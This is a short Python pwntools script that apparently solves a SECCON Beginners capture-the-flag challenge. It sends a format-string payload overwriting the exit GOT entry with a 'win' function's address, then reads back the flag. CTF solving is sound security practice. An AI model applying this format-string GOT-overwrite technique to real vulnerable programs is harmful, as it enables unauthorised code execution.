#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pure-and-easy.beginners.seccon.games", 9000)

    return r


def main():
    r = conn()
    payload = fmtstr_payload(offset=6, writes={exe.got["exit"]:exe.sym["win"]})
    r.sendlineafter(b"> ", payload)
    info(r.recvuntil(b"}"))


if __name__ == "__main__":
    main()
